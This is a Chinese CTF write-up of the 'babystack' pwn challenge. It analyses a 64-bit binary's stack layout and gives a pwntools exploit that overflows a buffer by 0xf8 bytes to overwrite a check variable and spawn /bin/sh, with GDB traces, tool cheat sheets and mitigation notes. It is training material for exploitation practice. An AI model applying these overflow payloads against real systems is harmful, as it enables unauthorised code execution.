# 解析2025强网拟态BabyStack

> 原文: https://www.ctfiot.com/276999.html
> ID: 276999

BabyStack – CTF PWN题完整技术解析

研究摘要

本篇文章记录了对CTF题目”babystack”的完整分析和漏洞利用过程。该题目是一道经典的栈溢出题，主要考察对栈结构的理解和变量覆盖技术。

核心发现：

漏洞类型：栈缓冲区溢出 → 变量覆盖

漏洞成因：第二次read()允许输入256字节，可覆盖栈上的检查变量

关键偏移：0xf8字节（248字节）精确覆盖

成功条件：将v3变量从0xabc1337覆盖为0x1337abc

最终效果：获得远程shell访问权限

静态分析（objdump、strings、checksec）

动态调试（GDB断点跟踪）

偏移计算（栈布局分析）

本地验证（Python快速测试）

Exploit开发（pwntools自动化）

题目名称：babystack

题目类型：PWN（二进制漏洞利用）

题目描述：拿到属于你的shell吧 / Get your own shell

ELF 64-bit：这是一个Linux下的64位可执行文件

LSB executable：小端序（Little-Endian）架构

x86-64：运行在64位x86处理器上

dynamically linked：动态链接，依赖共享库

not stripped：未去除符号表，便于调试和分析

Partial RELRO（部分重定位只读）

GOT表部分可写，但本题不涉及GOT劫持

No canary found（无栈保护）

这是关键！没有Stack Canary（栈金丝雀）保护

意味着可以随意进行栈溢出，不会被检测到

栈金丝雀是编译器在栈上放置的特殊值，函数返回前会检查这个值是否被修改

NX enabled（栈不可执行）

栈上的数据不能作为代码执行

无法直接在栈上放置shellcode并执行

需要使用ROP或者其他技术

No PIE（地址不随机化）

程序加载地址固定在0x400000

函数地址、字符串地址等都是固定的，便于利用

Not Stripped（未去除符号）

保留了函数名、变量名等调试信息

方便我们分析程序逻辑

设置标准输入/输出/错误流的缓冲模式（setvbuf）

调用pwn()函数（核心逻辑）

返回0

程序接收两次输入

打印输入内容

由于v3保持初始值0xabc1337，不等于0x1337abc

输出”you are a good boy.”（失败分支）

失败：you are a good boy.

成功：you are also a good boy.+ shell访问权限

第二次read的起始位置：rbp-0x120+0x18 = rbp-0x108

第二次read的大小：0x100 = 256字节

v3变量的位置：rbp-0x10

从read起点到v3的距离：0x108 - 0x10 = 0xf8 = 248字节

第二次read允许输入256字节

但从起点rbp-0x108到v3变量只有248字节的距离

因此，我们可以通过第二次输入，覆盖掉v3变量的值！

第一次输入随意填充（因为只是普通输入，不影响漏洞利用）

第二次输入构造特殊payload：

前248字节：垃圾数据（填充buf到v3之间的空间）

第249-256字节：将v3覆盖为0x1337abc

初始化时设置的是0xabc1337

但检查时比较的是0x1337abc

这是出题人故意设置的小陷阱（或者是初始化时的bug）

我们需要覆盖为检查时的值0x1337abc才能通过验证

大小：0x18 = 24字节

位置：buf的开始位置

目的：正常输入，随意填充即可

起点：buf + 0x18 = rbp-0x108

目标：覆盖rbp-0x10处的v3变量

偏移计算：

从第二次read起点到v3 = (rbp-0x108) - (rbp-0x10) = -0x108 - (-0x10) = 0x10 - 0x108 = -0xf8

实际距离是0xf8 = 248字节

p64()是pwntools提供的函数，将整数打包为8字节的小端序字节串

64位程序中，一个指针/长整型占用8字节

小端序：低位字节存储在低地址

例如：p64(0x1337abc)=xbcx7ax33x01x00x00x00x00

第一次输入：

sa(b':',b'a'*0x18)

使用sendafter()等待提示符”:”出现

程序打印”Enter your flag1:”，我们等到”:”后立即发送

这样可以确保时序正确

第二次输入：

s(b'a'*0xf8+ p64(0x1337abc))

使用send()直接发送

因为第一次输入后，程序立即提示第二次输入

直接发送即可，不需要等待

log_level='debug'：显示详细的调试信息

在学习阶段建议使用，可以看到每一步的交互过程

正式使用时可以改为'info'或'warning'

赋予执行权限：

chmod +x babystackchmod +x exploit.py

运行exploit：

python3 exploit.py

预期输出：

[*] Step 1: 发送第一个payload (0x18字节填充)[*] Step 2: 发送第二个payload (0xf8字节填充 + 目标值)[*] Step 3: 等待shell...[+] Exploit发送成功！如果一切顺利，你将获得一个shellGIMME GIMME SHELL /bin/sh$ whoamiyourname$ lsbabystack exploit.py

看到输出：”you are also a good boy.”

数据成功覆盖v3变量

通过了if检查

第一次输入的24个’a’被正确读取

第二次输入的248个’b’ + 8字节目标值被读取

在打印的字符串中可以看到�z3，这是0x1337abc的ASCII显示

最终触发成功分支：”you are also a good boy.”

xbc= 188 = 低字节

x7a= 122

x33= 51

x01= 1 = 高字节

向栈上的缓冲区写入超过其容量的数据

导致覆盖相邻的内存区域（变量、返回地址等）

可以控制程序执行流程或修改关键数据

变量覆盖型：不是覆盖返回地址，而是覆盖检查变量

精确控制型：需要精确计算偏移，只覆盖目标变量

条件绕过型：通过修改检查变量来绕过if条件判断

栈从高地址向低地址增长

变量按声明顺序从高到低分配

每个QWORD占用8字节

栈指针按16字节对齐

偏移计算：

必须精确计算从输入起点到目标变量的距离

工具：IDA Pro、GDB、objdump、readelf

字节序处理：

x86-64是小端序（Little-Endian）

使用pwntools的p64()自动处理

缓冲区管理：

理解程序的setvbuf设置

注意输入输出的同步问题

如果开启，在栈上放置随机值

函数返回前检查这个值是否被修改

本题未开启，所以可以任意溢出

标记栈段为不可执行

无法在栈上直接执行shellcode

需要使用ROP或者调用现有函数

系统级保护，随机化加载地址

本题PIE关闭，程序地址固定

可以直接使用硬编码地址

确认偏移计算正确（0xf8 = 248字节）

确认目标值正确（0x1337abc，不是0xabc1337）

确认字节序正确（使用p64()函数）

确认网络连接正常（远程攻击时）

确认Python版本（建议Python 3）

第一次输入：限制为0x18字节，无法溢出到v3

第二次输入：从buf+0x18开始，但给了0x100字节空间

组合利用：通过第二次输入的溢出来覆盖v3

增加题目难度，需要理解两次输入的关系

练习栈布局分析能力

考察精确偏移计算能力

泄露Canary：通过格式化字符串漏洞等泄露

覆盖时保持不变：在payload中填入正确的Canary值

暴力破解：fork服务器中Canary不变，可以逐字节爆破

信息泄露：利用其他漏洞泄露程序基址

相对偏移：程序内部的相对偏移不变

爆破：在某些情况下可以爆破地址的低位

ROP链：构造返回导向编程链

ret2libc：利用libc中的函数

shellcode：如果NX关闭，可以注入shellcode

心脏出血（Heartbleed）：OpenSSL的缓冲区越界读取

栈溢出CVE：各种软件的栈溢出漏洞

Web应用：PHP、Python等的栈溢出

使用安全的函数（fgets代替gets）

开启所有编译器保护（-fstack-protector-all）

严格检查输入长度

使用安全的内存操作函数（strncpy代替strcpy）

栈溢出原理：理解栈的内存布局和溢出机制

偏移计算：精确计算缓冲区到目标变量的距离

变量覆盖：通过溢出修改关键变量来绕过检查

工具使用：熟练使用pwntools、GDB、checksec等工具

CTF Wiki（https://ctf-wiki.org/）

BUUCTF等在线平台

《深入理解计算机系统》（CSAPP）

《黑客攻防技术宝典：系统实战篇》

64位ELF可执行文件

动态链接

未去除符号表（便于分析）

程序有两次输入

会回显输入内容

正常情况下输出”you are a good boy.”

存在两种成功/失败的提示信息

程序中硬编码了/bin/sh字符串

很可能调用system(“/bin/sh”)

v3初始化为0xabc1337

但检查时比较的是0x1337abc（不同！）

需要覆盖v3为0x1337abc

初始值陷阱：v3初始化为0xabc1337，但检查的是0x1337abc，这是出题人故意设置的

精确偏移：必须精确计算到字节，0xf8字节恰好到达v3位置

小端序重要性：x86-64是小端序，必须用p64()处理

两次输入设计：第一次限制长度，第二次才能溢出，增加了题目难度

成功标志：输出从”you are a good boy.”变为”you are also a good boy.”

file– 文件类型识别

checksec– 安全保护检查

strings– 字符串提取

objdump– 反汇编分析

gdb– 动态调试

pwntools– Exploit开发

python3– 脚本编写和测试

变量覆盖：覆盖栈上的关键变量（本题属于此类）

返回地址覆盖：劫持函数返回地址

函数指针覆盖：覆盖函数指针

SEH覆盖：Windows平台的异常处理覆盖

直接执行shellcode：NX关闭时可用

ret2text：返回到程序现有代码

ret2libc：返回到libc函数

ROP：返回导向编程

ret2syscall：直接调用系统调用

CVE-2014-0160 (Heartbleed)：OpenSSL心脏出血，缓冲区越界读取

CVE-2017-0144 (EternalBlue)：Windows SMB栈溢出，导致WannaCry勒索软件传播

CVE-2001-0144：早期的IIS缓冲区溢出

CVE-2019-14287：sudo权限绕过（并非栈溢出，但同样是内存安全问题）

OWASP Buffer Overflow Guide

Phrack Magazine历史文章

Exploit-DB漏洞数据库

CTF Wiki（ctf-wiki.org）


```
$ file babystackbabystack: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2,forGNU/Linux 2.6.32, BuildID[sha1]=4649ed5a3ce2485cb0c8ad02daa27011db41ae3f, not stripped
```



```
$ checksec babystack[*]'/mnt/hgfs/share/NRT/PWN/babystack/babystack' Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) Stripped: No
```



```
0000000000400819 <main>: 400819: push rbp 40081a: mov rbp,rsp 40081d: mov rax,QWORD PTR [rip+0x20086c] # 601090 <stdin@GLIBC_2.2.5> ... 40087c: call 400746 <pwn> # 调用pwn函数 400881: mov eax,0x0 400886: pop rbp 400887: ret
```



```
0000000000400746 <pwn>: ; 函数序言 400746: push rbp # 保存旧的rbp 400747: mov rbp,rsp # 设置新的栈帧 40074a: sub rsp,0x120 # 分配0x120(288)字节栈空间 ; 初始化缓冲区 400751: lea rax,[rbp-0x120] # 缓冲区起始地址 400758: mov edx,0x110 # memset大小：0x110(272)字节 40075d: mov esi,0x0 # 填充值：0 400762: mov rdi,rax # 目标地址 400765: call 400600 <memset@plt> # 清零缓冲区 ; 初始化检查变量 40076a: mov QWORD PTR [rbp-0x10],0xabc1337 # 关键！设置v3=0xabc1337 ; 第一次输入 400772: mov edi,0x40092e # "Enter your flag1:" 400777: mov eax,0x0 40077c: call 4005f0 <printf@plt> # 打印提示 400781: lea rax,[rbp-0x120] # 输入目标：buf 400788: mov edx,0x18 # 读取大小：0x18(24)字节 40078d: mov rsi,rax 400790: mov edi,0x0 # stdin 400795: call 400610 <read@plt> # 第一次read ; 第二次输入 40079a: mov edi,0x400940 # "Enter your flag2:" 40079f: mov eax,0x0 4007a4: call 4005f0 <printf@plt> # 打印提示 4007a9: lea rax,[rbp-0x120] 4007b0: add rax,0x18 # 输入目标：buf+0x18 4007b4: mov edx,0x100 # 读取大小：0x100(256)字节 漏洞点！ 4007b9: mov rsi,rax 4007bc: mov edi,0x0 # stdin 4007c1: call 400610 <read@plt> # 第二次read ; 打印输入内容 4007c6: lea rax,[rbp-0x120] 4007cd: lea rdx,[rax+0x18] # flag2 4007d1: lea rax,[rbp-0x120] # flag1 4007d8: mov rsi,rax 4007db: mov edi,0x400952 # "Nice!, %s, your flag2 is %s." 4007e0: mov eax,0x0 4007e5: call 4005f0 <printf@plt> ; 检查变量是否被修改 4007ea: mov rax,QWORD PTR [rbp-0x10] # 读取v3的值 4007ee: cmp rax,0x1337abc # 比较：v3 == 0x1337abc? 4007f4: jne 40080c <pwn+0xc6> # 不等则跳转到失败分支 ; 成功分支：获得shell 4007f6: mov edi,0x400970 # "GIMME GIMME SHELL /bin/sh" 4007fb: call 4005d0 <puts@plt> 400800: mov edi,0x400989 # "/bin/sh" 400805: call 4005e0 <system@plt> # 执行system("/bin/sh") 目标！ 40080a: jmp 400816 <pwn+0xd0> ; 失败分支 40080c: mov edi,0x400991 # "you are a good boy." 400811: call 4005d0 <puts@plt> 400816: nop 400817: leave 400818: ret
```



```
voidpwn(){ charbuf[0x110]; // 缓冲区，位于[rbp-0x120] longlongv3; // 检查变量，位于[rbp-0x10] memset(buf,0,0x110); // 清零缓冲区 v3 =0xabc1337; // 初始化检查变量 // 第一次输入 printf("Enter your flag1:"); read(0, buf,0x18); // 读取24字节到buf // 第二次输入 printf("Enter your flag2:"); read(0, buf +0x18,0x100);// 读取256字节到buf+0x18 危险！ // 打印输入 printf("Nice!, %s, your flag2 is %s.", buf, buf +0x18); // 检查v3是否被修改为目标值 if(v3 ==0x1337abc) { puts("you are also a good boy."); system("/bin/sh"); // 获得shell }else{ puts("you are a good boy."); }}
```



```
$echo-e"test1ntest2"| ./babystackEnter your flag1:Enter your flag2:Nice!, test1, your flag2 is test2.you are a good boy.
```



```
$ python3 exploit.pyEnter your flag1:Enter your flag2:Nice!, aaaaaa..., your flag2 is aaaaaa...you are also a good boy.$# 获得shell
```



```
高地址+------------------+| 返回地址 | rbp+0x8+------------------+| 保存的rbp | rbp (函数序言push rbp)+------------------+| ... | rbp-0x8+------------------+| v3变量 | rbp-0x10 目标变量！初始值0xabc1337+------------------+| ... |+------------------+| buf+0x18开始 | rbp-0x108 第二次read的起点| (第二次输入) || ... |+------------------+| buf开始 | rbp-0x120 第一次read的起点| (第一次输入) |+------------------+低地址
```



```
40076a: mov QWORD PTR [rbp-0x10],0xabc1337 # 初始化4007ee: cmp rax,0x1337abc # 检查
```



```
从第二次read起点到v3 = (rbp-0x108) - (rbp-0x10) = -0x108 - (-0x10) = 0x10 - 0x108 = -0xf8
```



```
# 第一次输入：24字节任意数据payload1 =b'a'*0x18# 第二次输入：248字节垃圾 + 8字节目标值payload2 =b'a'*0xf8+ p64(0x1337abc)
```



```
#!/usr/bin/env python3frompwnimport*# 配置elf = ELF('./babystack')context(os='linux', arch='amd64', log_level='debug')# 连接方式选择# 本地调试：# p = process('./babystack')# 远程连接：p = remote("pwn-728eea6d61.challenge.xctf.org.cn",9999, ssl=True)# 辅助函数定义defs(a): """发送数据""" p.send(a)defsa(a, b): """等待特定内容后发送""" p.sendafter(a, b)defsl(a): """发送一行数据""" p.sendline(a)defsla(a, b): """等待特定内容后发送一行""" p.sendlineafter(a, b)# ========== Exploit开始 ==========print("[*] Step 1: 发送第一个payload (0x18字节填充)")# 等待"Enter your flag1:"提示，发送24字节数据sa(b':',b'a'*0x18)print("[*] Step 2: 发送第二个payload (0xf8字节填充 + 目标值)")# 直接发送：248字节垃圾数据 + 8字节目标值s(b'a'*0xf8+ p64(0x1337abc))print("[*] Step 3: 等待shell...")print("[+] Exploit发送成功！如果一切顺利，你将获得一个shell")# 进入交互模式p.interactive()
```



```
sa(b':',b'a'*0x18)
```



```
s(b'a'*0xf8+ p64(0x1337abc))
```



```
context(os='linux', arch='amd64', log_level='debug')
```



```
chmod +x babystackchmod +x exploit.py
```



```
python3 exploit.py
```



```
[*] Step 1: 发送第一个payload (0x18字节填充)[*] Step 2: 发送第二个payload (0xf8字节填充 + 目标值)[*] Step 3: 等待shell...[+] Exploit发送成功！如果一切顺利，你将获得一个shellGIMME GIMME SHELL /bin/sh$ whoamiyourname$ lsbabystack exploit.py
```



```
p = remote("pwn-728eea6d61.challenge.xctf.org.cn",9999, ssl=True)
```



```
$ cat flagflag{xxxxxxxxxxxxxxx}
```



```
$ python3 -c"import sys; sys.stdout.buffer.write(b'a'*0x18); sys.stdout.buffer.write(b'b'*0xf8 + b'xbcx7ax33x01x00x00x00x00')"| ./babystackEnter your flag1:Enter your flag2:Nice!, aaaaaaaaaaaaaaaaaaaaaaaabbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb�z3, your flag2 is bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb�z3.you are also a good boy.
```



```
# 生成payload文件$ python3 -c"import sys; sys.stdout.buffer.write(b'a'*0x18); sys.stdout.buffer.write(b'b'*0xf8 + b'xbcx7ax33x01x00x00x00x00')"> payload.bin# 测试$ ./babystack < payload.binEnter your flag1:Enter your flag2:Nice!, ...(省略)...you are also a good boy.
```



```
>>>hex(0x1337abc)'0x1337abc'>>>importstruct>>>struct.pack('<Q',0x1337abc) # 小端序打包b'xbcx7ax33x01x00x00x00x00'
```



```
$ gdb ./babystackGNU gdb (Ubuntu 12.1-0ubuntu1~22.04) 12.1...(gdb) b *0x40076aBreakpoint 1 at 0x40076a(gdb) b *0x4007eaBreakpoint 2 at 0x4007ea(gdb) rStarting program: /path/to/babystack[Thread debugging using libthread_db enabled]Using host libthread_db library"/lib/x86_64-linux-gnu/libthread_db.so.1".Breakpoint 1, 0x000000000040076ainpwn ()
```



```
(gdb) x/gx$rbp-0x100x7fffffffd980: 0x000000000abc1337 # v3初始值(gdb) cContinuing.Enter your flag1:aaaaaaaaaaaaaaaaaaaaaaaaaEnter your flag2:bbbbbbbbbb...（输入exploit payload）Breakpoint 2, 0x00000000004007eainpwn ()
```



```
(gdb) x/gx$rbp-0x100x7fffffffd980: 0x0000000001337abc # v3已被覆盖！(gdb) p/x$rax$1= 0x1337abc(gdb) x/20gx$rbp-0x1200x7fffffffd870: 0x6161616161616161 0x6161616161616161 # buf开始（24个'a'）0x7fffffffd880: 0x6161616161616161 0x6262626262626262 # buf+0x18开始（248个'b'）0x7fffffffd890: 0x6262626262626262 0x6262626262626262...0x7fffffffd970: 0x6262626262626262 0x62626262626262620x7fffffffd980: 0x0000000001337abc 0x0000000000000000 # v3位置（已覆盖）
```



```
# 安装pwndbg后(gdb) stack 30 # 查看栈布局00:0000│ rsp 0x7fffffffd860 —▸ 0x7ffff7e1d083...1c:01c0│ 0x7fffffffd980 ◂— 0x1337abc # v3变量(gdb) telescope$rbp-0x120 40 # 详细查看缓冲区00:0000│ 0x7fffffffd870 ◂—'aaaaaaaa...'08:0040│ 0x7fffffffd878 ◂—'bbbbbbbb...'...
```



```
# 设置断点b *0x地址 # 在指定地址下断点b pwn # 在函数入口下断点# 查看内存x/10gx$rbp-0x10 # 查看8字节整数（十六进制）x/s 地址 # 查看字符串x/100xb 地址 # 查看100字节（十六进制字节）# 查看寄存器info registers # 查看所有寄存器p/x$rax # 查看rax寄存器（十六进制）# 执行控制r # 运行c # 继续n # 下一步（不进入函数）s # 单步（进入函数）ni/si # 汇编级单步
```



```
1. 信息收集 ├─ 检查文件类型（file） ├─ 检查保护机制（checksec） └─ 分析程序逻辑（objdump/IDA）2. 漏洞分析 ├─ 找到危险函数（read允许0x100字节） ├─ 分析栈布局（计算各变量位置） └─ 确认溢出条件（第二次read可覆盖v3）3. Exploit开发 ├─ 计算偏移（0xf8字节） ├─ 构造payload（填充+目标值） └─ 编写脚本（pwntools）4. 验证利用 ├─ 本地测试 ├─ 远程攻击 └─ 获取flag
```



```
$ file babystackbabystack: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2,forGNU/Linux 2.6.32, BuildID[sha1]=4649ed5a3ce2485cb0c8ad02daa27011db41ae3f, not stripped
```



```
$ checksec babystack[*]'/mnt/hgfs/share/NRT/PWN/babystack/babystack' Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found 可以栈溢出 NX: NX enabled PIE: No PIE (0x400000) 地址固定 Stripped: No
```



```
$echo"test"| timeout 2 ./babystackEnter your flag1:Enter your flag2:Nice!,test, your flag2 is .you are a good boy.
```



```
$ strings babystack | grep -E"(flag|shell|bin|good)"Enter your flag1:Enter your flag2:Nice!, %s, your flag2 is %s.you are also a good boy./bin/shyou are a good boy.
```



```
$ objdump -d babystack -M intel | grep -A 100"<pwn>:"
```



```
40076a: mov QWORD PTR [rbp-0x10],0xabc1337 # 初始化v3...4007ea: mov rax,QWORD PTR [rbp-0x10] # 读取v34007ee: cmp rax,0x1337abc # 比较！4007f4: jne 40080c <pwn+0xc6> # 不等则失败...400805: call 4005e0 <system@plt> # 成功：执行system
```



```
sub rsp, 0x120 # 分配288字节栈空间lea rax, [rbp-0x120] # buf的位置mov QWORD PTR [rbp-0x10]... # v3的位置
```



```
rbp-0x10: v3变量（目标）rbp-0x108: buf + 0x18（第二次read起点）rbp-0x120: buf（第一次read起点）
```



```
第一次read: 起点=rbp-0x120, 大小=0x18第二次read: 起点=rbp-0x108, 大小=0x100从第二次read起点到v3的距离:0x108 - 0x10 = 0xf8 = 248字节
```



```
# 第一次输入（随意填充）payload1 =b'a'*0x18# 第二次输入（精确覆盖）payload2 =b'a'*0xf8+ p64(0x1337abc) # ↑填充248字节 ↑覆盖v3为目标值
```



```
>>>frompwnimport*>>>p64(0x1337abc)b'xbcx7ax33x01x00x00x00x00'
```



```
$ python3 -c"import sys; sys.stdout.buffer.write(b'a'*0x18); sys.stdout.buffer.write(b'b'*0xf8 + b'xbcx7ax33x01x00x00x00x00')"| ./babystack输出：you are also a good boy. 成功！
```



```
$ gdb ./babystack(gdb) b *0x4007ea(gdb) r < payload.bin# 检查v3的值(gdb) x/gx$rbp-0x100x7fffffffd980: 0x0000000001337abc 覆盖成功！
```



```
#!/usr/bin/env python3frompwnimport*elf = ELF('./babystack')context(os='linux', arch='amd64', log_level='debug')# 连接方式p = remote("pwn-728eea6d61.challenge.xctf.org.cn",9999, ssl=True)# 发送payloadsa(b':',b'a'*0x18)s(b'a'*0xf8+ p64(0x1337abc))# 获得shellp.interactive()
```



```
1. 信息收集 ────► 发现无Canary保护2. 动态观察 ────► 了解程序基本行为3. 静态分析 ────► 发现v3检查逻辑4. 栈布局分析 ────► 计算偏移0xf85. Payload构造 ────► 设计精确覆盖方案6. 本地验证 ────► 确认exploit有效7. 编写脚本 ────► 完成自动化利用
```



```
# 文件类型检查file <binary># 安全保护检查checksec <binary># 字符串提取strings <binary>strings -n 6 <binary> # 只显示6个字符以上的字符串# 查看ELF头信息readelf -h <binary> # 查看头部readelf -l <binary> # 查看程序头readelf -S <binary> # 查看节头# 反汇编objdump -d <binary> # 反汇编代码段objdump -d -M intel <binary> # Intel语法objdump -s -j .rodata <binary> # 查看只读数据段# 查看符号表nm <binary>objdump -t <binary>
```



```
# 启动调试gdb ./babystackgdb -q ./babystack # 安静模式# 断点管理b *0x400746 # 在地址下断点b pwn # 在函数下断点info breakpoints # 查看所有断点delete 1 # 删除断点1# 执行控制r # 运行r < input.txt # 使用文件输入运行c # 继续n # 下一步（源码级）s # 单步进入ni # 下一条指令（汇编级）si # 单步进入（汇编级）finish # 执行到函数返回# 内存查看x/20gx$rsp # 查看栈（8字节整数）x/100xb$rbp-0x120 # 查看内存（字节）x/s 0x400970 # 查看字符串x/i$rip # 查看当前指令# 寄存器查看info registers # 所有寄存器info registers rax rbx # 指定寄存器p/x$rax # 打印寄存器值（十六进制）p/d$rax # 打印寄存器值（十进制）# 栈和帧backtrace # 查看调用栈info frame # 查看当前栈帧info args # 查看函数参数info locals # 查看局部变量
```



```
frompwnimport*# 连接p = process('./binary') # 本地进程p = remote('ip', port) # 远程TCPp = remote('ip', port, ssl=True) # 远程SSL# 发送数据p.send(data) # 发送原始数据p.sendline(data) # 发送一行p.sendafter(delim, data) # 接收到delim后发送p.sendlineafter(delim, data) # 接收到delim后发送一行# 接收数据p.recv(n) # 接收n字节p.recvline() # 接收一行p.recvuntil(delim) # 接收直到delimp.recvall() # 接收所有# 数据打包p64(value) # 打包为8字节小端序p32(value) # 打包为4字节小端序u64(data) # 解包8字节u32(data) # 解包4字节# 工具函数cyclic(100) # 生成100字节的循环模式cyclic_find(0x61616161) # 查找偏移# 交互和调试p.interactive() # 进入交互模式gdb.attach(p) # 附加GDBcontext.log_level ='debug' # 设置调试级别
```



```
# 安装基础工具sudo apt updatesudo apt install gdb python3 python3-pip# 安装pwntoolspip3 install pwntools# 安装pwndbg（GDB增强）gitclonehttps://github.com/pwndbg/pwndbgcdpwndbg./setup.sh# 安装其他工具sudo apt install binutils checksecpip3 install ROPgadget
```



```
# 关闭所有保护（方便练习）gcc -o vuln vuln.c -fno-stack-protector -z execstack -no-pie# 选项说明：# -fno-stack-protector 关闭栈保护（Canary）# -z execstack 允许栈执行（关闭NX）# -no-pie 关闭PIE（地址随机化）# -g 包含调试信息# 开启所有保护（生产环境）gcc -o secure secure.c -fstack-protector-all -D_FORTIFY_SOURCE=2 -pie -fPIE
```
